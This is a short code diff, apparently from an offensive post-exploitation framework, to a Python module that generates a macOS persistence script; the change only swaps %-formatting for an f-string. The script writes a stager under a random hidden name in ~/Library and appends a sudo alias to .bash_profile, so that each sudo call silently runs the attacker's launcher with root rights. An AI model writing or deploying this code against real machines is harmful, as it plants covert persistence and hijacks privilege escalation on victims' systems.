@@ -24,7 +24,7 @@ class Module:
             safeChecks=safeChecks,
         )
         launcher = launcher.replace('"', '\\"')
-        script = """
+        script = f"""
 import os
 from random import choice
 from string import ascii_uppercase
@@ -33,15 +33,13 @@ randomStr = ''.join(choice(ascii_uppercase) for i in range(12))
 bashlocation = home + "/Library/." + randomStr + ".sh"
 with open(home + "/.bash_profile", "a") as profile:
     profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
-launcher = "%s"
+launcher = "{launcher}"
 stager = "#!/bin/bash\\n"
 stager += launcher
 with open(bashlocation, 'w') as f:
     f.write(stager)
     f.close()
 os.chmod(bashlocation, 0755)
-""" % (
-            launcher
-        )
+"""
 
         return script
